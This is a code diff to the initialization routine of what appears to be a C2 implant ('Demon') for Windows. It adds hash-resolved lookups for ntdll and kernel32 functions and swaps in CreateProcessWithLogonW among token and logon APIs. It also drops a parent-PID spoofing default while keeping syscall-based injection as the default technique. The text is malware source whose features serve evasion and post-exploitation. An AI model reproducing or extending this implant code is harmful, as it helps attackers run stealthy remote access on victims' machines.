@@ -34,6 +34,8 @@ VOID DxInitialization( VOID )
         // Ntdll
         Instance->Win32.LdrGetProcedureAddress              = LdrFunctionAddr( Instance->Modules.Ntdll, 0x2e5a99f6 );
         Instance->Win32.LdrLoadDll                          = LdrFunctionAddr( Instance->Modules.Ntdll, 0x307db23  );
+        Instance->Win32.RtlAllocateHeap                     = LdrFunctionAddr( Instance->Modules.Ntdll, 0xc0b381da );
+        Instance->Win32.RtlFreeHeap                         = LdrFunctionAddr( Instance->Modules.Ntdll, 0x70ba71d7 );
         Instance->Win32.RtlExitUserThread                   = LdrFunctionAddr( Instance->Modules.Ntdll, 0x8e492b88 );
         Instance->Win32.RtlExitUserProcess                  = LdrFunctionAddr( Instance->Modules.Ntdll, 0x3aa1f0ef );
         Instance->Win32.RtlRandomEx                         = LdrFunctionAddr( Instance->Modules.Ntdll, 0x7c3439f5 );
@@ -73,6 +75,8 @@ VOID DxInitialization( VOID )
         Instance->Win32.Thread32First                       = LdrFunctionAddr( Instance->Modules.Kernel32, 0x93049a4a );
         Instance->Win32.GetComputerNameExA                  = LdrFunctionAddr( Instance->Modules.Kernel32, 0xd252a5f3 );
         Instance->Win32.ExitProcess                         = LdrFunctionAddr( Instance->Modules.Kernel32, 0xb769339e );
+        Instance->Win32.GetExitCodeProcess                  = LdrFunctionAddr( Instance->Modules.Kernel32, 0xe21026f9 );
+        Instance->Win32.GetExitCodeThread                   = LdrFunctionAddr( Instance->Modules.Kernel32, 0xb263c852 );
         Instance->Win32.TerminateProcess                    = LdrFunctionAddr( Instance->Modules.Kernel32, 0x60af076d );
         Instance->Win32.GetTickCount                        = LdrFunctionAddr( Instance->Modules.Kernel32, 0x41ad16b9 );
         Instance->Win32.ReadProcessMemory                   = LdrFunctionAddr( Instance->Modules.Kernel32, 0xb8932459 );
@@ -107,6 +111,7 @@ VOID DxInitialization( VOID )
         Instance->Win32.SetCurrentDirectoryW                = LdrFunctionAddr( Instance->Modules.Kernel32, 0xbec3a080 );
         Instance->Win32.Wow64DisableWow64FsRedirection      = LdrFunctionAddr( Instance->Modules.Kernel32, 0xd859b1d8 );
         Instance->Win32.Wow64RevertWow64FsRedirection       = LdrFunctionAddr( Instance->Modules.Kernel32, 0x72f47e1c );
+        Instance->Win32.GetModuleHandleA                    = LdrFunctionAddr( Instance->Modules.Kernel32, 0x5a153f58 );
     }
 
     // Check if it's min win xp. no one uses win 95 and below (from Meterpreter)
@@ -372,7 +377,7 @@ VOID DxInitialization( VOID )
     {
         Instance->Win32.GetTokenInformation                 = LdrFunctionAddr( Instance->Modules.Advapi32, FuncHash_GetTokenInformation );
         Instance->Win32.CreateProcessWithTokenW             = LdrFunctionAddr( Instance->Modules.Advapi32, 0x94e76e4c );
-        Instance->Win32.CreateProcessAsUserA                = LdrFunctionAddr( Instance->Modules.Advapi32, 0xb053cc2c );
+        Instance->Win32.CreateProcessWithLogonW             = LdrFunctionAddr( Instance->Modules.Advapi32, 0x823c224a );
         Instance->Win32.RevertToSelf                        = LdrFunctionAddr( Instance->Modules.Advapi32, FuncHash_RevertToSelf );
         Instance->Win32.GetUserNameA                        = LdrFunctionAddr( Instance->Modules.Advapi32, FuncHash_GetUserNameA );
         Instance->Win32.LogonUserA                          = LdrFunctionAddr( Instance->Modules.Advapi32, 0x609d56e4 );
@@ -509,7 +514,6 @@ VOID DxInitialization( VOID )
     // Setting config
     Instance->Config.AES.Key            = NULL;
     Instance->Config.AES.IV             = NULL;
-    Instance->Config.Process.PpidSpoof  = Instance->Session.PID;
     Instance->Config.Inject.Technique   = INJECTION_TECHNIQUE_SYSCALL; // default is just using syscalls
 
     PRINTF( "Instance DemonID => %x\n", Instance->Session.DemonID )
